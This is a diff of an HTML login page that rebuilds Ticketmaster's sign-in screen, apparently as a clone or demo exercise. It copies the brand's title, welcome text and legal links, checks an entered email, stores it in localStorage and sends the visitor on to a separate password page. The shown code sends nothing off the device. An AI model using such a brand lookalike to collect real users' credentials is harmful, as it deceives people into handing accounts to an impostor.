@@ -4,105 +4,202 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>login page</title>
+  <title>Sign In - Ticketmaster</title>
   <link rel="stylesheet" href="index.css">
+  <script>
+    // Function to handle form submission
+    function handleLogin(event) {
+      event.preventDefault();
+      
+      // Clear previous errors
+      clearErrors();
+      
+      const email = document.getElementById('email-input').value.trim();
+      
+      if (!email) {
+        showError('email-input', 'Please enter an email address');
+        return;
+      }
+      
+      if (!isValidEmail(email)) {
+        showError('email-input', 'Please enter a valid email address');
+        return;
+      }
+      
+      // Store email and show success modal
+      localStorage.setItem('userEmail', email);
+      showEmailSuccessModal();
+    }
+    
+    // Helper function to validate email
+    function isValidEmail(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+    
+    // Function to show error below input field
+    function showError(fieldId, message) {
+      const field = document.getElementById(fieldId);
+      const errorDiv = document.getElementById(fieldId + '-error');
+      if (errorDiv) {
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+      }
+      field.classList.add('error');
+    }
+    
+    // Function to clear all errors
+    function clearErrors() {
+      const errorElements = document.querySelectorAll('.error-message');
+      errorElements.forEach(error => {
+        error.style.display = 'none';
+      });
+      
+      const inputFields = document.querySelectorAll('.form-input');
+      inputFields.forEach(field => {
+        field.classList.remove('error');
+      });
+    }
+    
+    // Show email success modal
+    function showEmailSuccessModal() {
+      const modal = document.getElementById('email-success-modal');
+      modal.style.display = 'flex';
+    }
+    
+    // Close email success modal and go to password page
+    function goToPasswordPage() {
+      const modal = document.getElementById('email-success-modal');
+      modal.style.display = 'none';
+      window.location.href = 'password.html';
+    }
+    
+    // Enable the continue button when email is entered
+    function enableContinueButton() {
+      const email = document.getElementById('email-input').value;
+      const continueBtn = document.getElementById('continue-btn');
+      
+      if (email && email.includes('@')) {
+        continueBtn.disabled = false;
+        continueBtn.classList.remove('disabled');
+        continueBtn.classList.add('enabled');
+      } else {
+        continueBtn.disabled = true;
+        continueBtn.classList.add('disabled');
+        continueBtn.classList.remove('enabled');
+      }
+    }
+    
+    // Handle passkey login
+    function handlePasskeyLogin() {
+      alert('Passkey login would be implemented here. For demo purposes, redirecting to email login...');
+      document.getElementById('email-input').focus();
+    }
+    
+    // Load page when DOM is ready
+    document.addEventListener('DOMContentLoaded', function() {
+      // Add event listener to form
+      const form = document.querySelector('form');
+      form.addEventListener('submit', handleLogin);
+      
+      // Add event listener to email input
+      const emailInput = document.getElementById('email-input');
+      emailInput.addEventListener('input', enableContinueButton);
+      
+      // Add event listener to continue button
+      const continueBtn = document.getElementById('continue-btn');
+      continueBtn.addEventListener('click', handleLogin);
+      
+      // Add event listener to passkey button
+      const passkeyBtn = document.getElementById('passkey-btn');
+      passkeyBtn.addEventListener('click', handlePasskeyLogin);
+    });
+  </script>
 </head>
 
 <body>
-  <div class="sc-pbXLt jyNywJ">
-    <div class="sc-pQERe eXzml">
-      <div class="sc-pYATD geuAXS"></div>
-      <div class="sc-oUbIU iQZetn">
-        <div data-focus-guard="true" tabindex="0"
-          style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
-        <div data-focus-lock-disabled="false" class="sc-psbuI efwYHr">
-          <div class="sc-pjGtN kExgRT">
-            <div class="sc-fzoyAV fQsatj">
-              <div class="sc-fzqNJr hXQgjp">
-                <div tabindex="-1" class="sc-fznZeY gQVeaE layout">
-                  <div class="sc-fzokOt hLgJkJ">
-                    <div data-bdd="left-column" class="sc-fzoXWK bGqbZH">
-                      <div role="contentinfo" class="sc-fzpmMD exrhPS">
-                        <div class="sc-fzpans lUKGY"><span
-                            class="TextStyle__Mauna-sc-1vd3o1f-0 sc-fznxKY bbmRot">Welcome</span></div>
-                        <div class="sc-fzpans lUKGY"><span
-                            class="TextStyle__Boising-sc-1vd3o1f-8 sc-fznMAR iBFNqE">Discover millions of events, get
-                            alerts about your favorite artists, teams, plays and more — plus always- secure, effortless
-                            ticketing.</span></div>
-                        <div class="sc-fzpans lUKGY"></div>
-                      </div><img src="/assets/ticketmaster-logo-white-small.bb30b12d.svg" alt="Ticketmaster logo"
-                        class="sc-fznWOq cqDPIl">
-                    </div>
-                  </div>
-                  <div class="sc-fzqBZW eNQuho">
-                    <main class="sc-pkURi jKvUwv">
-                      <form novalidate="" class="sc-qPkqk kuHLLu">
-                        <div class="sc-qOjhQ hCGKYR">
-                          <div id="scrollContent" class="sc-qWfkp dooIXp">
-                            <div data-bdd="header" class="sc-pkvSM sc-pCPhY HuWkf">
-                              <header class="sc-fzomME hhnKZs">
-                                <div class="sc-fzqMAW himZKo"><span data-bdd="header"
-                                    class="TextStyle__Vinson-sc-1vd3o1f-4 kznocf">SIGN IN OR CREATE ACCOUNT </span>
-                                </div>
-                              </header>
-                              <div data-bdd="title" class="sc-pDdXR eXQEVx">If you don’t have an account you will be
-                                prompted to create one. </div>
-                            </div>
-                            <div id="Main" class="sc-pkvSM sc-pcYTN eMptst">
-                              <div class="sc-pmhIX moCtG"></div>
-                              <div class="Stack-sc-br1alc-0 ciIxdB">
-                                <div class="sc-pIvzE fxkdVm">
-                                  <div class="Stack-sc-br1alc-0 ciIxdB">
-                                    <div id="email" class="indexstyles__InputField-sc-ruvmzp-0 kqWNWc"><label
-                                        for="email-input" font-size="uno"
-                                        class="indexstyles__Label-sc-ruvmzp-1 kNGiKL">Email Address</label>
-                                      <div class="indexstyles__Row-sc-ruvmzp-2 kEtlfZ"><input name="email"
-                                          autocomplete="email" type="email" data-bdd="email-address-field"
-                                          aria-invalid="false" required="" id="email-input"
-                                          aria-describedby="email-error email-success"
-                                          class="indexstyles__Input-sc-ruvmzp-3 fXaQta" value=""></div>
-                                      <div id="email-success" font-size="uno" color="text.primary"
-                                        class="indexstyles__Validation-sc-ruvmzp-13 hbIIUi"></div>
-                                    </div>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                            <div class="sc-pkvSM sc-psrQp sc-qPJtC dECEbW">
-                              <div class="sc-qXFrf fBislN"><button name="sign-in" type="submit" aria-disabled="true"
-                                  data-bdd="sign-in-button"
-                                  class="indexstyles__StyledButton-sc-83qv1q-0 eMddAo sc-pAkMi eGxTJR"><span
-                                    class="indexstyles__FlexWrapper-sc-83qv1q-1 TMKNp"><span
-                                      class="indexstyles__Text-sc-83qv1q-2 eTxqqd"><span class="sc-pQrCd hptqUu"><span
-                                          class="sc-pYMCY ijlbYH">Continue</span></span></span></span></button></div>
-                              <p data-bdd="sign-in-footer-copy" class="sc-pdkDa jGnIqs"><span
-                                  class="TextStyle__Etna-sc-1vd3o1f-9 ixYJOT">By continuing past this page, you agree to
-                                  the <a target="_blank" data-bdd="tos-link" tabindex=""
-                                    class="Link__StyledLink-sc-pudy0l-0 ikIpye sc-pIgJL iXyRju"
-                                    href="https://help.ticketmaster.com/hc/en-us/articles/10468830739345-Terms-of-Use">Terms
-                                    of Use</a> and understand that information will be used as described in our <a
-                                    target="_blank" data-bdd="privacy-policy-link" tabindex=""
-                                    class="Link__StyledLink-sc-pudy0l-0 ikIpye sc-pIgJL iXyRju"
-                                    href="https://privacy.ticketmaster.com/privacy-policy">Privacy Policy</a>.<div
-                                    class="sc-qZusK leHEvE">As set forth in our Privacy Policy, we may use your
-                                    information for email marketing, including promotions and updates on our own or
-                                    third-party products. You can opt out of our marketing emails anytime.</div></span>
-                              </p>
-                            </div>
+  <div class="login-container">
+    <!-- Left Column - Welcome Section -->
+    <div class="welcome-section">
+      <div class="welcome-content">
+        <h1 class="welcome-title">WELCOME</h1>
+        <div class="welcome-divider"></div>
+        <p class="welcome-description">
+          Discover millions of events, get alerts about your favorite artists, teams, plays and more — plus always- secure, effortless ticketing.
+        </p>
+        <div class="welcome-logo">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+            <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+          </svg>
+        </div>
                           </div>
                         </div>
-                      </form>
-                    </main>
-                    <div id="eps-captcha" style=""></div>
-                  </div>
-                </div>
-              </div>
-            </div>
+
+    <!-- Right Column - Login Form -->
+    <div class="login-section">
+      <div class="login-content">
+        <h2 class="login-title">SIGN IN OR CREATE ACCOUNT</h2>
+        <p class="login-subtitle">If you don't have an account you will be prompted to create one.</p>
+        
+        <form class="login-form">
+          <div class="form-group">
+            <label for="email-input" class="form-label">Email Address</label>
+            <input 
+              type="email" 
+              id="email-input" 
+              name="email" 
+              class="form-input" 
+              autocomplete="email"
+              required
+            />
+            <div id="email-input-error" class="error-message"></div>
           </div>
+          
+          <button type="submit" id="continue-btn" class="continue-btn disabled" disabled>
+            Continue
+          </button>
+          
+          <div class="signup-section">
+            <p class="signup-text">Don't have an account?</p>
+            <a href="signup.html" class="signup-link">Sign Up</a>
+          </div>
+          
+          <div class="divider">
+            <span class="divider-text">OR</span>
+          </div>
+          
+          <button type="button" id="passkey-btn" class="passkey-btn">
+            <svg class="passkey-icon" viewBox="0 0 24 24" width="20" height="20">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+            </svg>
+            Sign In With A Passkey
+          </button>
+          
+          <a href="#" class="passkey-help">What's A Passkey?</a>
+        </form>
+        
+        <div class="legal-text">
+          <p>
+            By continuing past this page, I acknowledge that I have read and agree to the current 
+            <a href="https://help.ticketmaster.com/hc/en-us/articles/10468830739345-Terms-of-Use" target="_blank" class="legal-link">Terms of Use</a>, 
+            including the arbitration agreement and class action waiver, updated in August 2025, and understand that information will be used as described in our 
+            <a href="https://privacy.ticketmaster.com/privacy-policy" target="_blank" class="legal-link">Privacy Policy</a>.
+          </p>
+          <p>
+            As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
+          </p>
         </div>
-        <div data-focus-guard="true" tabindex="0"
-          style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div>
       </div>
+    </div>
+  </div>
+
+  <!-- Email Success Modal -->
+  <div id="email-success-modal" class="success-modal">
+    <div class="success-modal-content">
+      <div class="success-icon">📧</div>
+      <h3 class="success-title">Email Verified!</h3>
+      <p class="success-message">Great! Now please enter your password to complete the sign-in process.</p>
+      <button onclick="goToPasswordPage()" class="success-button">Continue to Password</button>
     </div>
   </div>
 </body>
